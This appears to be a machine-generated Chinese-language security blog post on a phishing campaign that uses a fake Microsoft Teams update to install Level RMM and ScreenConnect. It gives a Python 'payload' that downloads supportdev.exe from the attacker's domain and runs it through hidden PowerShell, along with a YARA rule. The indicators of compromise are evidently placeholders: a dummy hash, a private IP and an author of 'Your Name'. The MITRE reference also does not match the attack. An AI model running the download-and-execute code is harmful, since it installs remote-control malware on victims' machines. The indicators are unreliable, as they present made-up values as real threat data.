---
layout: post
title:  "Operation BlueDash Deploys Level RMM and ScreenConnect via Fake Teams Update"
date:   2026-07-27 14:15:57 +0000
categories: [security]
severity: high
---

# 🔥 解析 Operation BlueDash：Microsoft Teams 主題的釣魚攻擊與 RMM 工具滲透
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `PowerShell`, `Inno Setup`, `RMM` (Remote Monitoring and Management)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Microsoft Teams 主題的釣魚郵件，誘騙受害者下載並安裝惡意的 RMM 工具，從而實現遠程控制和資料竊取。
* **攻擊流程圖解**:
  1. 受害者收到釣魚郵件，點擊連結導向假的 Microsoft Store 頁面。
  2. 假的 Microsoft Store 頁面要求受害者更新 Microsoft Teams。
  3. 受害者下載並安裝惡意的 RMM 工具（supportdev.exe）。
  4. RMM 工具啟動 PowerShell，在隱藏窗口下載和安裝官方的 Level RMM 安裝程式。
  5. RMM 工具註冊受害者的端點，使用攻擊者控制的 enrollment secret。
* **受影響元件**: Microsoft Teams、Level RMM、ConnectWise ScreenConnect

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要有 Microsoft Teams 的帳戶和網路連接。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載 RMM 工具
    url = "https://support.berrydev.xyz/supportdev.exe"
    response = requests.get(url)
    with open("supportdev.exe", "wb") as f:
        f.write(response.content)
    
    # 啟動 PowerShell
    import subprocess
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", "supportdev.exe"])
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術繞過防火牆和入侵檢測系統，例如使用加密通訊協定（如 HTTPS）和隱藏 PowerShell 腳本。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | support.berrydev.xyz |
| File Path | C:\Windows\Temp\supportdev.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule OperationBlueDash {
        meta:
            description = "Operation BlueDash RMM 工具"
            author = "Your Name"
        strings:
            $a = "supportdev.exe"
            $b = "powershell.exe -WindowStyle Hidden"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 更新 Microsoft Teams 和 RMM 工具至最新版本，啟用防火牆和入侵檢測系統，監控 PowerShell 活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **RMM (Remote Monitoring and Management)**: 遠程監控和管理技術，允許 IT 管理員遠程監控和控制計算機和其他設備。
* **PowerShell**: 微軟的任務自動化和配置管理框架，允許用戶執行命令和腳本。
* **Inno Setup**: 一種用於創建 Windows 安裝程式的工具。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/operation-bluedash-deploys-level-rmm.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


